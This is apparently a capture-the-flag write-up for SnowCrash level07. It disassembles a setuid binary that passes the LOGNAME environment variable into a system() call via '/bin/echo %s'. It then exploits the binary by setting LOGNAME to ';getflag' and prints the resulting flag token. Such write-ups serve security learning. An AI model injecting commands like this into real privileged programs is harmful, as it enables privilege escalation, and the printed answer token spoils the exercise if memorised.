# level07

## Recognition

There is an executable named level07 at the home of user level07 which is owned by flag07
```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

When checking `strings` on the executable, we can see the use of `system` and `getenv` calls
```bash 
level07@SnowCrash:~$ strings level07
[...]
getenv
[...]
system
[...]
```

When checking the .rodata section of the program, we can see the strings "LOGNAME" and "/bin/echo %s"
```bash
level07@SnowCrash:~$ readelf -x .rodata level07 

Hex dump of section '.rodata':
  0x08048678 03000000 01000200 4c4f474e 414d4500 ........LOGNAME.
  0x08048688 2f62696e 2f656368 6f202573 2000     /bin/echo %s .
```
</br>
</br>

When disassembled with `objdump`, we can see that it uses the "LOGNAME" string for `getenv` and then recomposes the string "/bin/echo %s" with the environment variable using asprintf. the string is then passed to the `system` call which executes it.
```bash

[...]
08048514 <main>:
 8048514:       55                      push   ebp
 8048515:       89 e5                   mov    ebp,esp
 8048517:       83 e4 f0                and    esp,0xfffffff0
 804851a:       83 ec 20                sub    esp,0x20
 804851d:       e8 ce fe ff ff          call   80483f0 <getegid@plt>
 8048522:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
 8048526:       e8 b5 fe ff ff          call   80483e0 <geteuid@plt>
 804852b:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 804852f:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 8048533:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048537:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 804853b:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 804853f:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 8048543:       89 04 24                mov    DWORD PTR [esp],eax
 8048546:       e8 05 ff ff ff          call   8048450 <setresgid@plt>
 804854b:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 804854f:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048553:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048557:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 804855b:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 804855f:       89 04 24                mov    DWORD PTR [esp],eax
 8048562:       e8 69 fe ff ff          call   80483d0 <setresuid@plt>
 8048567:       c7 44 24 14 00 00 00    mov    DWORD PTR [esp+0x14],0x0
 804856e:       00 
 804856f:       c7 04 24 80 86 04 08    mov    DWORD PTR [esp],0x8048680     // address of "LOGNAME"
 8048576:       e8 85 fe ff ff          call   8048400 <getenv@plt>
 804857b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804857f:       c7 44 24 04 88 86 04    mov    DWORD PTR [esp+0x4],0x8048688 // address of "/bin/echo %s"
 8048586:       08 
 8048587:       8d 44 24 14             lea    eax,[esp+0x14]
 804858b:       89 04 24                mov    DWORD PTR [esp],eax
 804858e:       e8 ad fe ff ff          call   8048440 <asprintf@plt>
 8048593:       8b 44 24 14             mov    eax,DWORD PTR [esp+0x14]
 8048597:       89 04 24                mov    DWORD PTR [esp],eax
 804859a:       e8 71 fe ff ff          call   8048410 <system@plt>
 804859f:       c9                      leave  
 80485a0:       c3                      ret
 [...]
```

## Exploitation

For this one, the exploitation part is quite simple, as the content of an environment variable is directly inputted to a `system` call, that the script is owned by flag07, we can use that to execute whatever we want as flag07 user.

We can simply exploit this program to get our flag by doing :
```bash
level07@SnowCrash:~$ export LOGNAME=';getflag'
level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
